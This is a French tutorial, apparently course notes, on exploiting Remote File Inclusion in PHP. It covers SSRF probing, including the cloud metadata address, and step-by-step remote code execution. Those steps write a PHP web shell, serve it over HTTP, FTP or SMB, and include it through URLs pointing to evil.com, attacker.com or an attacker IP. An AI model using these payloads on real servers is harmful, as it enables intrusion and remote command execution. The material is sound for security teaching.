# Remote File Inclusion (RFI)

***

#### <mark style="color:green;">Inclusion de Fichiers à Distance (RFI)</mark>

Jusqu’à présent dans ce module, nous nous sommes principalement concentrés sur les **inclusions de fichiers locaux** (_Local File Inclusion – LFI_).\
Cependant, dans certains cas, il est également possible d’inclure des fichiers **à distance** — on parle alors de **Remote File Inclusion (RFI)** — si la fonction vulnérable autorise l'inclusion d’URL distantes.

***

#### <mark style="color:green;">🎯 Avantages de la RFI</mark>

L’inclusion de fichiers distants permet **deux bénéfices principaux** :

1. **Énumération de services internes** (ex : ports ouverts ou applications web locales)\
   → via des attaques de type **SSRF** (_Server-Side Request Forgery_)
2. **Exécution de code à distance (RCE)**\
   → en hébergeant un **script PHP malveillant** sur un serveur que nous contrôlons, puis en le faisant inclure dans la page vulnérable.

***

#### <mark style="color:green;">📌 LFI vs RFI</mark>

Lorsqu’une fonction vulnérable autorise l’inclusion de fichiers distants, on peut potentiellement **héberger un script malveillant (shell PHP)** et le faire exécuter par la cible.

**🧠 Exemple de RFI :**

```php
include($_GET['page']);
```

Requête RFI possible :

```
http://vuln.site/index.php?page=http://attacker.com/shell.txt
```

> Résultat : le script `shell.txt` hébergé à distance est inclus et exécuté sur le serveur cible.

***

#### <mark style="color:green;">🔍 Fonctions PHP vulnérables à RFI (et LFI)</mark>

Selon le tableau dans la section précédente, les fonctions suivantes permettent des inclusions de fichiers :

* `include()`
* `include_once()`
* `require()`
* `require_once()`
* `fopen()`
* `file_get_contents()`
* `readfile()`
* `copy()`

***

#### ⚠️ À noter

* **Presque toutes les vulnérabilités RFI sont aussi des LFI**, car une fonction qui autorise les URL autorise généralement aussi les chemins locaux.
* MAIS l’inverse n’est **pas forcément vrai** : une LFI n’est **pas toujours une RFI**.

**🔒 3 raisons principales pour lesquelles une LFI ≠ RFI :**

1. **La fonction vulnérable ne permet pas les URL distantes**\
   → Ex : `file_exists()` ou `is_file()` peuvent refuser `http://`.
2. **L'utilisateur ne contrôle pas l'entièreté de la chaîne (préfixe imposé)**\
   → Ex : on ne peut pas injecter `http://evil.com/shell.php` car seul le nom de fichier est modifiable.
3.  **Configuration du serveur :**\
    → Par défaut, la plupart des serveurs PHP **désactivent** les inclusions distantes :

    ```ini
    allow_url_include = Off
    allow_url_fopen = Off
    ```

***

#### <mark style="color:green;">🛰️ RFI sans exécution de code : SSRF</mark>

Même si une fonction permet l’inclusion d’une URL distante **sans exécuter le code**, cela peut être **exploité pour du SSRF** (Server-Side Request Forgery).

**✅ Utilisations typiques dans ce cas :**

* Scanner des **services internes** (`http://localhost:8080`)
* Lire des **fichiers HTTP exposés** (par ex : `http://169.254.169.254/latest/meta-data/`)
* Déterminer la présence de ports/services à partir des erreurs (temps de réponse, etc.)

***

#### 🧪 Exemple d’attaque RFI pour RCE

```php
include($_GET['load']);
```

**Script malveillant hébergé sur serveur contrôlé :**

```php
<?php system($_GET['cmd']); ?>
```

**URL d'exploitation :**

```
http://vuln.site/index.php?load=http://evil.com/shell.php&cmd=id
→ Résultat : exécution de la commande `id` sur le serveur cible
```

***

#### <mark style="color:green;">🔍 Vérification de la RFI</mark>

* La plupart des langages (dont PHP) **désactivent par défaut l’inclusion de fichiers distants**.
* En PHP, il faut que `allow_url_include = On` dans le `php.ini` pour inclure des URL distantes avec `include()` / `require()`.

**✅ Vérifier via LFI :**

```bash
$ echo 'W1BIUF0KCjs7Ozs7...==' | base64 -d | grep allow_url_include
```

🔹 Si la réponse contient `allow_url_include = On`, alors **l'inclusion distante est peut-être possible**.

***

#### 🧪 Tester l’inclusion d’une URL locale (détection SSRF/RFI)

```url
http://cible/index.php?page=http://127.0.0.1/index.php
```

* Si on obtient le contenu de la page, la RFI est **activée**.
* Peut permettre d’**énumérer des services locaux** : ex. `http://127.0.0.1:8080/`

***

#### 💥 Exécution de code à distance (RCE)

**1. Préparer un web shell PHP :**

```bash
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**2. L’héberger avec un serveur HTTP local :**

```bash
$ sudo python3 -m http.server 80
```

**3. L’inclure via la RFI :**

```url
http://cible/index.php?page=http://<IP>:80/shell.php&cmd=id
```

📌 Vérifier si `.php` est ajouté automatiquement par le serveur.

***

#### 🔁 Autres protocoles utilisables

**📡 FTP (si HTTP bloqué ou filtré)**

1. Lancer un serveur FTP :

```bash
$ sudo python -m pyftpdlib -p 21
```

2. RFI avec FTP :

```url
http://cible/index.php?page=ftp://<IP>/shell.php&cmd=id
```

🔐 Si authentification requise :

```url
ftp://user:pass@<IP>/shell.php
```

***

**🪟 SMB (serveur Windows)**

1. Lancer un serveur SMB :

```bash
$ impacket-smbserver -smb2support share $(pwd)
```

2. Inclure avec chemin UNC :

```url
\\<IP>\share\shell.php&cmd=whoami
```

⚠️ Fonctionne surtout **en réseau local** (SMB distant souvent bloqué).

***

#### 🧠 À retenir

* ✅ **RFI activée** → possible **RCE + SSRF**
* ❌ `allow_url_include` désactivé → souvent limité à **LFI**
* 🔥 Protocoles supportés : `http://`, `ftp://`, `smb://` (Windows)
* ⚠️ Les pare-feux/WAFs peuvent bloquer certaines chaînes (`http://`, `ftp://`)

***
